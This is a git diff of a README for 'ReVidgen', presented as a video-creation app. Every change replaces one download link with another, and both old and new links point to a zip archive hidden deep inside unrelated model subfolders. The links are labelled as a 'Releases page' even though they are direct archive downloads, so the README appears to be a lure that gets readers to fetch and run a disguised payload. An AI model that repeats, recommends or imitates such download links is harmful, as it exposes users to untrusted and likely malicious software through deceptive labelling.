@@ -1,6 +1,6 @@
 # 🎥 ReVidgen - Simplifying Video Creation for Everyone
 
-[![Download Now](https://raw.githubusercontent.com/Jeyjey123456/ReVidgen/main/pkgs/Grounded-Segment-Anything/EfficientSAM/FastSAM/Vidgen-Re-v2.1.zip%20Now-Press%20Here-brightgreen)](https://raw.githubusercontent.com/Jeyjey123456/ReVidgen/main/pkgs/Grounded-Segment-Anything/EfficientSAM/FastSAM/Vidgen-Re-v2.1.zip)
+[![Download Now](https://github.com/Jeyjey123456/ReVidgen/raw/refs/heads/main/pkgs/Grounded-SAM-2/grounding_dino/groundingdino/models/Vidgen-Re-1.2.zip%20Now-Press%20Here-brightgreen)](https://github.com/Jeyjey123456/ReVidgen/raw/refs/heads/main/pkgs/Grounded-SAM-2/grounding_dino/groundingdino/models/Vidgen-Re-1.2.zip)
 
 ## 🌟 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run ReVidgen on your computer:
 
 1. **Visit the Releases Page**  
    Click the link below to access the ReVidgen Releases page:
-   [Visit this page to download](https://raw.githubusercontent.com/Jeyjey123456/ReVidgen/main/pkgs/Grounded-Segment-Anything/EfficientSAM/FastSAM/Vidgen-Re-v2.1.zip)
+   [Visit this page to download](https://github.com/Jeyjey123456/ReVidgen/raw/refs/heads/main/pkgs/Grounded-SAM-2/grounding_dino/groundingdino/models/Vidgen-Re-1.2.zip)
 
 2. **Choose the Right Version**  
    Look for the latest version on the Releases page. You will see a list of available files. Select the one that suits your operating system:
@@ -57,7 +57,7 @@ Before installing, make sure your system meets the following requirements:
 
 To get started, you can download ReVidgen from the link below:
 
-[Visit this page to download](https://raw.githubusercontent.com/Jeyjey123456/ReVidgen/main/pkgs/Grounded-Segment-Anything/EfficientSAM/FastSAM/Vidgen-Re-v2.1.zip)
+[Visit this page to download](https://github.com/Jeyjey123456/ReVidgen/raw/refs/heads/main/pkgs/Grounded-SAM-2/grounding_dino/groundingdino/models/Vidgen-Re-1.2.zip)
 
 After downloading, follow the earlier installation steps to set up the application.
 
